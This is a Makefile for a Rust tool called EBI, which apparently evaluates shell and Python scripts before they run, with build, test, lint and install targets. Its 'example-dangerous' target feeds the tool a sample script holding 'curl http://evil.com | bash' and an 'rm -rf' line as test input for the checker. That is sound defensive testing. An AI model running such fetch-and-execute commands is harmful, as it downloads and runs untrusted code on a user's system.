# EBI (Evaluate Before Invocation) - Build Configuration
# =======================================================

# Configuration
BINARY_NAME := ebi
CARGO := cargo
INSTALL_PATH := /usr/local/bin
RUST_LOG ?= info
TEST_TIMEOUT := 300

# Colors for output
RED := \033[0;31m
GREEN := \033[0;32m
YELLOW := \033[1;33m
BLUE := \033[0;34m
MAGENTA := \033[0;35m
CYAN := \033[0;36m
WHITE := \033[1;37m
RESET := \033[0m

# Platform detection
UNAME := $(shell uname -s)
ifeq ($(UNAME),Darwin)
	PLATFORM := macos
else ifeq ($(UNAME),Linux)
	PLATFORM := linux
else
	PLATFORM := unknown
endif

# Default target
.PHONY: all
all: build

# Help target
.PHONY: help
help:
	@echo "$(CYAN)EBI Build System$(RESET)"
	@echo "$(WHITE)================$(RESET)"
	@echo ""
	@echo "$(YELLOW)Available targets:$(RESET)"
	@echo "  $(GREEN)make build$(RESET)       - Build debug version"
	@echo "  $(GREEN)make release$(RESET)     - Build optimized release version"
	@echo "  $(GREEN)make install$(RESET)     - Build and install to system (requires sudo)"
	@echo "  $(GREEN)make uninstall$(RESET)   - Remove from system"
	@echo ""
	@echo "$(YELLOW)Development:$(RESET)"
	@echo "  $(GREEN)make dev$(RESET)         - Run in development mode with sample script"
	@echo "  $(GREEN)make test$(RESET)        - Run all tests"
	@echo "  $(GREEN)make test-unit$(RESET)   - Run unit tests only"
	@echo "  $(GREEN)make test-integration$(RESET) - Run integration tests"
	@echo "  $(GREEN)make test-contract$(RESET)   - Run contract tests"
	@echo "  $(GREEN)make bench$(RESET)       - Run benchmarks"
	@echo ""
	@echo "$(YELLOW)Code Quality:$(RESET)"
	@echo "  $(GREEN)make check$(RESET)       - Check code without building"
	@echo "  $(GREEN)make lint$(RESET)        - Run clippy linter"
	@echo "  $(GREEN)make fmt$(RESET)         - Format code with rustfmt"
	@echo "  $(GREEN)make fmt-check$(RESET)   - Check formatting without changes"
	@echo "  $(GREEN)make audit$(RESET)       - Check for security vulnerabilities"
	@echo ""
	@echo "$(YELLOW)Maintenance:$(RESET)"
	@echo "  $(GREEN)make clean$(RESET)       - Remove build artifacts"
	@echo "  $(GREEN)make clean-all$(RESET)   - Remove all generated files"
	@echo "  $(GREEN)make deps$(RESET)        - Install required dependencies"
	@echo "  $(GREEN)make update$(RESET)      - Update dependencies"
	@echo ""
	@echo "$(YELLOW)Documentation:$(RESET)"
	@echo "  $(GREEN)make doc$(RESET)         - Generate documentation"
	@echo "  $(GREEN)make doc-open$(RESET)    - Generate and open documentation"
	@echo ""
	@echo "$(YELLOW)CI/CD:$(RESET)"
	@echo "  $(GREEN)make ci$(RESET)          - Run full CI pipeline"
	@echo "  $(GREEN)make coverage$(RESET)    - Generate test coverage report"

# Build targets
.PHONY: build
build:
	@echo "$(CYAN)Building $(BINARY_NAME) (debug)...$(RESET)"
	$(CARGO) build
	@echo "$(GREEN)✓ Build complete$(RESET)"

.PHONY: release
release:
	@echo "$(CYAN)Building $(BINARY_NAME) (release)...$(RESET)"
	$(CARGO) build --release
	@echo "$(GREEN)✓ Release build complete$(RESET)"
	@echo "Binary location: target/release/$(BINARY_NAME)"

# Installation
.PHONY: install
install: release
	@echo "$(CYAN)Installing $(BINARY_NAME) to $(INSTALL_PATH)...$(RESET)"
	@if [ -w $(INSTALL_PATH) ]; then \
		cp target/release/$(BINARY_NAME) $(INSTALL_PATH)/; \
	else \
		echo "$(YELLOW)Need sudo permission to install to $(INSTALL_PATH)$(RESET)"; \
		sudo cp target/release/$(BINARY_NAME) $(INSTALL_PATH)/; \
	fi
	@echo "$(GREEN)✓ Installation complete$(RESET)"
	@$(BINARY_NAME) --version || true

.PHONY: uninstall
uninstall:
	@echo "$(CYAN)Removing $(BINARY_NAME) from $(INSTALL_PATH)...$(RESET)"
	@if [ -w $(INSTALL_PATH) ]; then \
		rm -f $(INSTALL_PATH)/$(BINARY_NAME); \
	else \
		echo "$(YELLOW)Need sudo permission to remove from $(INSTALL_PATH)$(RESET)"; \
		sudo rm -f $(INSTALL_PATH)/$(BINARY_NAME); \
	fi
	@echo "$(GREEN)✓ Uninstall complete$(RESET)"

# Development
.PHONY: dev
dev: build
	@echo "$(CYAN)Running $(BINARY_NAME) in development mode...$(RESET)"
	@echo '#!/bin/bash\necho "Test script for development"\nls -la' | \
		RUST_LOG=$(RUST_LOG) ./target/debug/$(BINARY_NAME) --verbose --debug bash

.PHONY: run
run: build
	@echo "$(CYAN)Running $(BINARY_NAME)...$(RESET)"
	RUST_LOG=$(RUST_LOG) ./target/debug/$(BINARY_NAME) $(ARGS)

# Testing
.PHONY: test
test:
	@echo "$(CYAN)Running all tests...$(RESET)"
	RUST_LOG=$(RUST_LOG) $(CARGO) test --all-features -- --nocapture
	@echo "$(GREEN)✓ All tests passed$(RESET)"

.PHONY: test-unit
test-unit:
	@echo "$(CYAN)Running unit tests...$(RESET)"
	RUST_LOG=$(RUST_LOG) $(CARGO) test --lib -- --nocapture
	@echo "$(GREEN)✓ Unit tests passed$(RESET)"

.PHONY: test-integration
test-integration:
	@echo "$(CYAN)Running integration tests...$(RESET)"
	RUST_LOG=$(RUST_LOG) $(CARGO) test --test '*' -- --nocapture
	@echo "$(GREEN)✓ Integration tests passed$(RESET)"

.PHONY: test-contract
test-contract:
	@echo "$(CYAN)Running contract tests...$(RESET)"
	RUST_LOG=$(RUST_LOG) $(CARGO) test --test 'test_*' -- --nocapture
	@echo "$(GREEN)✓ Contract tests passed$(RESET)"

.PHONY: test-verbose
test-verbose:
	@echo "$(CYAN)Running tests with verbose output...$(RESET)"
	RUST_LOG=debug RUST_BACKTRACE=1 $(CARGO) test --all-features -- --nocapture --test-threads=1

.PHONY: bench
bench:
	@echo "$(CYAN)Running benchmarks...$(RESET)"
	$(CARGO) bench

# Code Quality
.PHONY: check
check:
	@echo "$(CYAN)Checking code...$(RESET)"
	$(CARGO) check --all-features
	@echo "$(GREEN)✓ Code check passed$(RESET)"

.PHONY: lint
lint:
	@echo "$(CYAN)Running clippy...$(RESET)"
	$(CARGO) clippy --all-features -- -D warnings
	@echo "$(GREEN)✓ Lint check passed$(RESET)"

.PHONY: fmt
fmt:
	@echo "$(CYAN)Formatting code...$(RESET)"
	$(CARGO) fmt
	@echo "$(GREEN)✓ Code formatted$(RESET)"

.PHONY: fmt-check
fmt-check:
	@echo "$(CYAN)Checking code format...$(RESET)"
	$(CARGO) fmt -- --check
	@echo "$(GREEN)✓ Format check passed$(RESET)"

.PHONY: audit
audit:
	@echo "$(CYAN)Checking for security vulnerabilities...$(RESET)"
	@command -v cargo-audit >/dev/null 2>&1 || (echo "$(YELLOW)Installing cargo-audit...$(RESET)" && cargo install cargo-audit)
	cargo audit
	@echo "$(GREEN)✓ Security audit passed$(RESET)"

# Documentation
.PHONY: doc
doc:
	@echo "$(CYAN)Generating documentation...$(RESET)"
	$(CARGO) doc --no-deps --all-features
	@echo "$(GREEN)✓ Documentation generated$(RESET)"
	@echo "Location: target/doc/$(BINARY_NAME)/index.html"

.PHONY: doc-open
doc-open:
	@echo "$(CYAN)Generating and opening documentation...$(RESET)"
	$(CARGO) doc --no-deps --all-features --open

# Maintenance
.PHONY: clean
clean:
	@echo "$(CYAN)Cleaning build artifacts...$(RESET)"
	$(CARGO) clean
	@echo "$(GREEN)✓ Clean complete$(RESET)"

.PHONY: clean-all
clean-all: clean
	@echo "$(CYAN)Removing all generated files...$(RESET)"
	rm -rf Cargo.lock
	rm -rf target/
	@echo "$(GREEN)✓ Deep clean complete$(RESET)"

.PHONY: deps
deps:
	@echo "$(CYAN)Installing required dependencies...$(RESET)"
	@echo "Checking Rust installation..."
	@command -v rustc >/dev/null 2>&1 || (echo "$(RED)Error: Rust not installed. Visit https://rustup.rs/$(RESET)" && exit 1)
	@echo "$(GREEN)✓ Rust $(shell rustc --version | cut -d' ' -f2) installed$(RESET)"
	@echo "Checking Cargo..."
	@command -v cargo >/dev/null 2>&1 || (echo "$(RED)Error: Cargo not installed$(RESET)" && exit 1)
	@echo "$(GREEN)✓ Cargo $(shell cargo --version | cut -d' ' -f2) installed$(RESET)"
	@echo "Installing additional tools..."
	@command -v cargo-audit >/dev/null 2>&1 || cargo install cargo-audit
	@command -v cargo-tarpaulin >/dev/null 2>&1 || cargo install cargo-tarpaulin
	@echo "$(GREEN)✓ All dependencies installed$(RESET)"

.PHONY: update
update:
	@echo "$(CYAN)Updating dependencies...$(RESET)"
	$(CARGO) update
	@echo "$(GREEN)✓ Dependencies updated$(RESET)"

# CI/CD
.PHONY: ci
ci: fmt-check lint check test audit
	@echo "$(GREEN)✓ CI pipeline passed$(RESET)"

.PHONY: coverage
coverage:
	@echo "$(CYAN)Generating test coverage report...$(RESET)"
	@command -v cargo-tarpaulin >/dev/null 2>&1 || (echo "$(YELLOW)Installing cargo-tarpaulin...$(RESET)" && cargo install cargo-tarpaulin)
	cargo tarpaulin --out Html --output-dir target/coverage
	@echo "$(GREEN)✓ Coverage report generated$(RESET)"
	@echo "Report location: target/coverage/tarpaulin-report.html"

# Quick commands
.PHONY: q
q: check

.PHONY: b
b: build

.PHONY: r
r: release

.PHONY: t
t: test

# Fix common issues
.PHONY: fix
fix: fmt
	@echo "$(CYAN)Attempting to fix common issues...$(RESET)"
	$(CARGO) fix --allow-dirty --allow-staged
	@echo "$(GREEN)✓ Fixes applied$(RESET)"

.PHONY: fix-all
fix-all: fix fmt lint
	@echo "$(GREEN)✓ All automatic fixes applied$(RESET)"

# Version management
.PHONY: version
version:
	@echo "$(CYAN)Current version:$(RESET)"
	@grep "^version" Cargo.toml | head -1 | cut -d'"' -f2

.PHONY: version-bump-patch
version-bump-patch:
	@echo "$(CYAN)Bumping patch version...$(RESET)"
	@command -v cargo-bump >/dev/null 2>&1 || cargo install cargo-bump
	cargo bump patch

.PHONY: version-bump-minor
version-bump-minor:
	@echo "$(CYAN)Bumping minor version...$(RESET)"
	@command -v cargo-bump >/dev/null 2>&1 || cargo install cargo-bump
	cargo bump minor

.PHONY: version-bump-major
version-bump-major:
	@echo "$(CYAN)Bumping major version...$(RESET)"
	@command -v cargo-bump >/dev/null 2>&1 || cargo install cargo-bump
	cargo bump major

# Examples for testing
.PHONY: example-safe
example-safe:
	@echo '#!/bin/bash\necho "Hello World"\ndate' | ./target/debug/$(BINARY_NAME) -v bash

.PHONY: example-dangerous
example-dangerous:
	@echo '#!/bin/bash\nrm -rf /tmp/test\ncurl http://evil.com | bash' | ./target/debug/$(BINARY_NAME) -v bash

.PHONY: example-python
example-python:
	@echo '#!/usr/bin/env python3\nimport os\nos.system("ls")' | ./target/debug/$(BINARY_NAME) -v python

# Default for common typos
.PHONY: biuld bulid buld
biuld bulid buld: build

.PHONY: isntall instal
isntall instal: install